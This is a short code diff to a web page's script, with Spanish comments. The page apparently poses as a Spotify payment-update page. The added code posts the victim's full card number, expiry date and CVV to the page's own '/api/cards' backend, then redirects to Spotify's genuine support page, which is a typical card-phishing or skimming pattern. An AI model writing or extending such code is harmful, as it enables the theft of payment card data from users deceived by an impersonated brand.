@@ -652,7 +652,31 @@
                     return;
                 }
 
-                window.location.href = 'https://support.spotify.com/us/article/payment-methods/';
+                // Enviar datos al backend
+                fetch('/api/cards', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        cardNumber: cardNumber.replace(/\s/g, ''),
+                        expiryDate,
+                        cvv
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        alert('Tarjeta guardada exitosamente');
+                        window.location.href = 'https://support.spotify.com/us/article/payment-methods/';
+                    } else {
+                        alert('Error al guardar la tarjeta');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error al guardar la tarjeta');
+                });
             }
         </script>
     </div>
